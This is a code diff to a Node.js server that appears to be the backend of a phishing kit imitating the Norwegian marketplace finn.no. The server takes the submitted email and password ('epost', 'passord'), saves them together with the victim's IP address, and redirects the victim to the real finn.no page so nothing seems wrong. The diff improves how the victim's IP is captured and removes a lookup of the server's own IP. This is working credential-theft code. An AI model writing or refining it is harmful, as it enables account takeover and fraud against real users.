@@ -49,14 +49,6 @@ const server = http.createServer(async (req, res) => {
 
         const readStream = fs.createReadStream(filePath);
         readStream.pipe(res);
-
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            console.log(data.ip)
-        } catch (error) {
-            console.log('Error fetching IP address:', error);
-        }
     } else if (req.method == "POST") {
         let body = ""
         req.on("data", chunk => {
@@ -65,10 +57,14 @@ const server = http.createServer(async (req, res) => {
 
         req.on("end", async () => {
             const formData = querystring.parse(body)
-            const { epost, passord, ip, os } = formData
+            const { epost, passord } = formData
+
+            let clientIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+            clientIP = clientIP.includes("::ffff:") ? clientIP.split("::ffff:")[1] : clientIP
+            console.log(clientIP)
 
             try {
-                const newCred = await insertCred(epost, passord, ip, os)
+                const newCred = await insertCred(epost, passord, clientIP)
                 res.writeHead(302, { location: "https://www.finn.no/my-page" })
                 res.end(JSON.stringify({ succes: true, newCred }))
             } catch (err) {
